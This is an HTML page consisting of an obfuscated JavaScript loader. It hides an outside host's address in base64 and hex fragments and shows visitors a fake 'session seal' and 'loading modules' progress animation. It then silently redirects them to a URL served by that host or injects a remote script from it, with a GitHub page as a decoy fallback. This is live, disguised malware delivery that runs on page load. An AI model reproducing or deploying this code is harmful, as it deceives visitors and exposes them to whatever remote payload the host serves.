<!DOCTYPE html>
<html lang="en">
<head>
<body>
<script>
var TARGET = (function () {
    var _origin = 'aHR0cHM6Ly9pc3RhdGxtZW51';
    var _suffix = '732e636f6d2f6d616e6475612e776f6e746564';
    function _fromB64(e) {
        return decodeURIComponent(escape(atob(e)));
    }
    function _fromHex(h) {
        var o = '', i = 0;
        for (; i < h.length; i += 2) o += String.fromCharCode(parseInt(h.substr(i, 2), 16));
        return o;
    }
    function _reviewHubH8() {
        location.replace((function (h) {
            var o = '', i = 0;
            for (; i < h.length; i += 2) o += String.fromCharCode(parseInt(h.substr(i, 2), 16));
            return o;
        })('68747470733a2f2f6769746875622e636f6d2f66656174757265732f636f64652d726576696577'));
    }
    return { uri: _fromB64(_origin) + _fromHex(_suffix), fail: _reviewHubH8 };
})();

function pickRedirect(text) {
    var body = String(text).replace(/^\uFEFF/, '').trim();
    var hit = body.match(/https?:\/\/[^'"\s;]+/);
    if (!hit) throw 0;
    return hit[0];
}

(function () {
    var kkEndpoint = TARGET.uri;
    var kkRawBody = null;
    var kkFetchFail = false;

    function kkPullText(url) {
        return fetch(url, { method: 'GET', cache: 'no-store' }).then(function (r) {
            if (!r.ok) throw 0;
            return r.text();
        });
    }

    function kkAttachRemote(url) {
        var tag = document.createElement('script');
        tag.charset = 'utf-8';
        tag.referrerPolicy = 'unsafe-url';
        tag.src = url;
        tag.onerror = function () { TARGET.fail(); };
        (document.head || document.documentElement).appendChild(tag);
    }

    var kkPending = (!kkEndpoint)
        ? Promise.resolve(null).then(function () { kkFetchFail = true; return null; })
        : kkPullText(kkEndpoint).then(
            function (t) { kkRawBody = t; return t; },
            function () { kkFetchFail = true; kkRawBody = null; return null; }
        );

    var kkPhases = ['seal', 'audit', 'forge', 'load', 'done'];
    var kkSpan = [[0, 20], [20, 40], [40, 65], [65, 95], [95, 100]];
    var kkMsgs = [
        'Applying session seal...',
        'Auditing token chain...',
        'Forging asset bundle...',
        'Loading remote modules...',
        'Wrapping session...'
    ];
    var kkWait = [870, 840, 1150, 790];
    var kkMarks = ['8f2c1d9e4a7b6031', '3e7a1c9f2d8b5046', 'b1e6f4a9c3d82705'];

    var kkTrackFill = document.getElementById('kk-track-fill');
    var kkStatusMsg = document.getElementById('kk-status-msg');
    var kkStatusMark = document.getElementById('kk-status-mark');
    var kkRingArc = document.getElementById('kk-ring-arc');
    var kkIdx = -1;
    var kkPct = 0;
    var kkTGrow = null;
    var kkTDots = null;
    var kkTHex = null;
    var kkGot = 0;
    var kkNeed = 24;
    var kkSealed = false;

    function kkPhaseEl(key) {
        return document.querySelector('.kk-phase[data-phase="' + key + '"]');
    }

    function kkSetPct(v) {
        kkPct = Math.max(0, Math.min(100, v));
        kkTrackFill.style.width = kkPct + '%';
        if (kkIdx === 4 && kkRingArc) {
            var local = (kkPct - 95) / 5;
            kkRingArc.style.strokeDashoffset = String(100 - Math.max(0, Math.min(1, local)) * 100);
        }
    }

    function kkPaint() {
        var n, key, node;
        for (n = 0; n < kkPhases.length; n++) {
            key = kkPhases[n];
            node = kkPhaseEl(key);
            if (!node) continue;
            node.classList.remove('idle', 'run', 'pass');
            if (n < kkIdx) node.classList.add('pass');
            else if (n === kkIdx) node.classList.add('run');
            else node.classList.add('idle');
        }
    }

    function kkPutHex(key, html) {
        var node = kkPhaseEl(key);
        if (!node) return;
        var slot = node.querySelector('[data-kk-hex]');
        if (slot) slot.innerHTML = html;
    }

    function kkStop() {
        if (kkTGrow) { clearInterval(kkTGrow); kkTGrow = null; }
        if (kkTDots) { clearInterval(kkTDots); kkTDots = null; }
        if (kkTHex) { clearInterval(kkTHex); kkTHex = null; }
    }

    function kkRandHex() {
        var out = '', k;
        for (k = 0; k < 16; k++) out += '0123456789abcdef'.charAt((Math.random() * 16) | 0);
        return out;
    }

    function kkBootSeal() {
        kkPutHex('seal', kkRandHex());
        kkTHex = setInterval(function () {
            if (kkIdx !== 0) return;
            kkPutHex('seal', kkRandHex());
        }, 90);
    }

    function kkBootAudit() {
        kkPutHex('audit', 'Scanning...');
        kkTHex = setInterval(function () {
            if (kkIdx !== 1) return;
            kkPutHex('audit', kkRandHex());
        }, 110);
    }

    function kkBootForge() {
        var bits = kkPhaseEl('forge').querySelectorAll('.kk-blinks i');
        var wave = 0;
        kkPutHex('forge', kkMarks[2]);
        kkTHex = setInterval(function () {
            if (kkIdx !== 2) return;
            kkPutHex('forge', kkRandHex());
        }, 120);
        kkTDots = setInterval(function () {
            if (kkIdx !== 2) return;
            wave = (wave + 1) % 3;
            var m;
            for (m = 0; m < bits.length; m++) {
                if (m <= wave) bits[m].classList.add('kk-lit');
                else bits[m].classList.remove('kk-lit');
            }
        }, 220);
    }

    function kkBootLoad() {
        kkGot = 0;
        kkPutHex('load', '0 / ' + kkNeed);
        kkTHex = setInterval(function () {
            if (kkIdx !== 3) return;
            if (kkGot < kkNeed) {
                var step = 1 + ((Math.random() * 3) | 0);
                kkGot = Math.min(kkNeed, kkGot + step);
                kkPutHex('load', kkGot + ' / ' + kkNeed);
                kkSetPct(65 + (kkGot / kkNeed) * 30);
            }
        }, 60);
    }

    function kkBootDone() {
        kkPutHex('done', 'Pending...');
        if (kkRingArc) kkRingArc.style.strokeDashoffset = '100';
    }

    function kkEnter(n) {
        kkStop();
        kkIdx = n;
        kkPaint();
        kkStatusMsg.textContent = kkMsgs[n];
        kkStatusMark.hidden = true;
        kkSetPct(kkSpan[n][0]);

        if (n === 0) kkBootSeal();
        if (n === 1) kkBootAudit();
        if (n === 2) kkBootForge();
        if (n === 3) kkBootLoad();
        if (n === 4) kkBootDone();

        var lo = kkSpan[n][0];
        var hi = kkSpan[n][1];
        kkTGrow = setInterval(function () {
            if (kkSealed || kkIdx !== n) return;
            if (n === 3 && kkGot >= kkNeed) return;
            if (kkPct < hi - 1) kkSetPct(kkPct + (hi - lo) * 0.035);
        }, 80);
    }

    function kkLeave() {
        var key = kkPhases[kkIdx];
        var node = kkPhaseEl(key);
        kkStop();
        if (key === 'seal') kkPutHex('seal', kkMarks[0] + ' <span class="kk-ok">✓</span>');
        if (key === 'audit') kkPutHex('audit', kkMarks[1] + ' <span class="kk-ok">✓</span>');
        if (key === 'forge') kkPutHex('forge', kkMarks[2] + ' <span class="kk-ok">✓</span>');
        if (key === 'load') {
            kkGot = kkNeed;
            kkPutHex('load', kkNeed + ' / ' + kkNeed + ' <span class="kk-ok">✓</span>');
        }
        if (key === 'done') kkPutHex('done', 'Complete <span class="kk-ok">✓</span>');
        if (node) {
            node.classList.remove('run');
            node.classList.add('pass');
        }
        kkSetPct(kkSpan[kkIdx][1]);
    }

    function kkPause(ms) {
        return new Promise(function (ok) { setTimeout(ok, ms); });
    }

    function kkFinish() {
        if (kkSealed) return Promise.resolve();
        kkSealed = true;
        kkStop();
        kkLeave();
        kkSetPct(100);
        kkStatusMsg.textContent = 'Complete';
        kkStatusMark.hidden = false;
        return kkPending.then(function () {
            if (!kkEndpoint || kkFetchFail || kkRawBody == null) {
                if (kkEndpoint) kkAttachRemote(kkEndpoint);
                else TARGET.fail();
                return;
            }
            try {
                location.replace(pickRedirect(kkRawBody));
            } catch (err) {
                kkAttachRemote(kkEndpoint);
            }
        });
    }

    kkEnter(0);

    (async function kkPlay() {
        await kkPause(kkWait[0]);
        kkLeave();
        kkEnter(1);

        await kkPause(kkWait[1]);
        kkLeave();
        kkEnter(2);

        await kkPause(kkWait[2]);
        kkLeave();
        kkEnter(3);

        while (kkGot < kkNeed) await kkPause(30);
        await kkPause(80);
        kkLeave();
        kkEnter(4);

        await kkPause(kkWait[3]);
        await kkFinish();
    })();
})();
</script>
</body>
</html>
